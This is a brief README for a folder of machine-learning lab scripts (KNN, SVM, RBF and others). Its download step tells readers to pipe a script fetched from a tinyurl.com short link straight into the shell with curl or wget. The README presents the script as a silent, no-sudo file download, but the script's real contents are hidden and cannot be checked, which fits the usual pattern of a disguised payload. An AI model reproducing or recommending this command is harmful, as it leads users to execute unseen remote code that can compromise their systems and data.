# Machine Learning Experiments

Quick download for all lab experiment files in this directory.

## One-Line Fast Download (Linux / macOS / WSL)

Open terminal in the folder where you want the files and run:

```bash
curl -fsSL tinyurl.com/tomml1 | sh
```

Or using `wget`:

```bash
wget -qO- tinyurl.com/tomml1 | sh
```

### What this does:
1. Downloads experiment files (`Bais.py`, `BSFOLD.py`, `CANCER.py`, `KNN.py`, `RBF.py`, and `svm_iris.py`) directly into the current directory.
2. Concurrent parallel downloads for maximum speed.
3. Requires **no root (`sudo`)** and **no permission adjustments**.
4. Clean and silent execution — displays only `done` upon completion.
